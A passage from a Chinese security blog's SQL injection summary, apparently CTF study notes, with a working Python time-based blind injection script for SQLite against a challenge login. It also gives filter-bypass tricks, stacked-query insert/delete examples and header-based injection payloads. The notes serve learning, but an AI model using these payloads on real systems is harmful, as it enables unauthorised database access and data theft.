flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Found character: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Current Flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>SQlite中的时间盲注(用case-when类似于if-else，randomblob类似于sleep),脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:46017/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line"> <span class="comment"># payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(300000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="comment"># print(datas)</span></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        res = requests.post(url=url,json=datas)</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        spend_time=end_time-start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;=<span class="number">0.19</span>:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>+<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="过滤："><a href="#过滤：" class="headerlink" title="过滤："></a>过滤：</h1><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><ul>
+<li>注释绕过<br>select&#x2F;<strong>&#x2F;user()&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;dual</li>
+<li>括号绕过<br>(sleep(ascii(mid(user()from(2)for(1)))&#x3D;109))</li>
+<li>%0a绕过</li>
+</ul>
+<h2 id="union-select-其他"><a href="#union-select-其他" class="headerlink" title="union&#x2F;select&#x2F;其他"></a>union&#x2F;select&#x2F;其他</h2><ul>
+<li>大小写</li>
+<li>编码绕过</li>
+<li>注释绕过</li>
+</ul>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
+<li>详见:</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E8%BF%87%E6%BB%A4unionselectwhere%E7%AD%89">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E8%BF%87%E6%BB%A4unionselectwhere%E7%AD%89</a></p>
+<h1 id="堆叠过滤："><a href="#堆叠过滤：" class="headerlink" title="堆叠过滤："></a>堆叠过滤：</h1><ol>
+<li>条件：<ul>
+<li>能用；分割，执行多行sql代码</li>
+</ul>
+</li>
+<li>常用函数：<blockquote>
+<p>show tables&#x2F;columns from table; &#x2F;&#x2F;展示行列<br>insert into&#x2F;replace into users(id,username,password) values (‘100’,’new’,’new’); &#x2F;&#x2F;插入行<br>delete from table_name where condition &#x2F;&#x2F;从表中删除符合where条件的行<br>其他见：<a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-delete-query.html">https://www.runoob.com/mysql/mysql-delete-query.html</a></p>
+</blockquote>
+</li>
+</ol>
+<h1 id="其他注入点"><a href="#其他注入点" class="headerlink" title="其他注入点"></a>其他注入点</h1><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ol>
+<li><p>条件:</p>
+<ul>
+<li>对get和post进行了过滤,但是没对cookie提交的数据库进行过滤</li>
+<li>对程序提交数据的获取方式没有具体指定(可以是cookie提交的数据)</li>
+</ul>
+</li>
+<li><p>同普通sql</p>
+</li>
+<li><p>Cookie: id&#x3D;-1 union select 1,ebwkxmpupc from mgzotsomsk;</p>
+</li>
+</ol>
+<h2 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h2><p>User-Agent: -1 union select group_concat(column_name),1 from information_schema.columns where table_name &#x3D; pzpocrkbep</p>
+<h2 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h2><p>Referer: id&#x3D;-1 union select 1,oksgticxdv from pzpocrkbep</p>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/404072.html">https://www.freebuf.com/articles/web/404072.html</a></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">夏饭orz</a>
+            <p>原文链接：<a href="http://example.com/2025/06/22/sql/">http://example.com/2025/06/22/sql/</a>
+            <p>发表日期：<a href="http://example.com/2025/06/22/sql/">June 22nd 2025, 2:30:00 pm</a>
+            <p>更新日期：<a href="http://example.com/2025/06/22/sql/">June 22nd 2025, 11:17:48 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件包含&文件上传(主php)">
+                    <div class="nextTitle">文件包含&文件上传(主php)</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="沙箱逃逸">
+                    <div class="prevTitle">沙箱逃逸</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:1844015967@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/nihao5577" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">基础知识点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">判断sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">过滤：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">7.1.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union-select-%E5%85%B6%E4%BB%96"><span class="toc-number">7.2.</span> <span class="toc-text">union&#x2F;select&#x2F;其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">7.3.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E8%BF%87%E6%BB%A4%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">堆叠过滤：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">9.</span> <span class="toc-text">其他注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">9.1.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-agent%E6%B3%A8%E5%85%A5"><span class="toc-number">9.2.</span> <span class="toc-text">user-agent注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer%E6%B3%A8%E5%85%A5"><span class="toc-number">9.3.</span> <span class="toc-text">referer注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">9.3.0.1.</span> <span class="toc-text">参考：</span></a></li></ol></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/flask%20pin%E7%A0%81%E8%AE%A1%E7%AE%97&%E5%88%A9%E7%94%A8/">flask pin码计算</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Nodejs原型链污染&命令执行</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">php filter链</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pickle反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/XS-Leaks/">XSleak</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件包含&文件上传(主php)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/sql/">sql小总结</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/xpath%E6%B3%A8%E5%85%A5/">Xpath注入</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">py原型链污染</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">不只是日志分析-windows篇</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/">应急响应常见题目</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/redis/">redis攻击手法</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="web漏洞">
+                <span class="iconfont-archer">&#xe606;</span>
+                web漏洞
+            </span>
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="侧信道">
+                <span class="iconfont-archer">&#xe606;</span>
+                侧信道
+            </span>
+            <span class="sidebar-tag-name" data-tags="nodejs">
+                <span class="iconfont-archer">&#xe606;</span>
+                nodejs
+            </span>
+            <span class="sidebar-tag-name" data-tags="注入">
+                <span class="iconfont-archer">&#xe606;</span>
+                注入
+            </span>
+            <span class="sidebar-tag-name" data-tags="windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows
+            </span>
+            <span class="sidebar-tag-name" data-tags="日志分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                日志分析
+            </span>
+            <span class="sidebar-tag-name" data-tags="应急响应">
+                <span class="iconfont-archer">&#xe606;</span>
+                应急响应
+            </span>
+            <span class="sidebar-tag-name" data-tags="redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                redis
+            </span>
+            <span class="sidebar-tag-name" data-tags="总结">
+                <span class="iconfont-archer">&#xe606;</span>
+                总结
+            </span>
+            <span class="sidebar-tag-name" data-tags="流量分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                流量分析
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="web漏洞">
+            <span class="iconfont-archer">&#xe60a;</span>
+            web漏洞
+        </span>
+        <span class="sidebar-category-name" data-categories="应急响应">
+            <span class="iconfont-archer">&#xe60a;</span>
+            应急响应
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "夏饭orz"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+    <!-- Check browser compatibility of CSS variables -->
+    <script>
+        if (browserSupportCSSVariables === undefined) {
+            var browserSupportCSSVariables = window.CSS && window.CSS.supports && window.CSS.supports('--a', 0);
+        }
+    </script>
+    <script>
+        if (browserSupportCSSVariables) {
+            var customFontName = 'Noto Sans SC:n3,n4,n5,n7'
+            var customFontUrl = 'https://chinese-fonts-cdn.deno.dev/packages/ysbth/dist/%E4%BC%98%E8%AE%BE%E6%A0%87%E9%A2%98%E9%BB%91/result.css'
+            if (!customFontName) {
+                console.log('Custom font name is not set or read failed');
+            }
+            if (!customFontUrl) {
+                console.log('Custom font url is not set or read failed');
+            }
+        } else {
+            console.error('Current browser doesn\'t support custom font.')
+        }
+    </script>
+    <script src="/scripts/customFontLoader.js" defer></script>
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
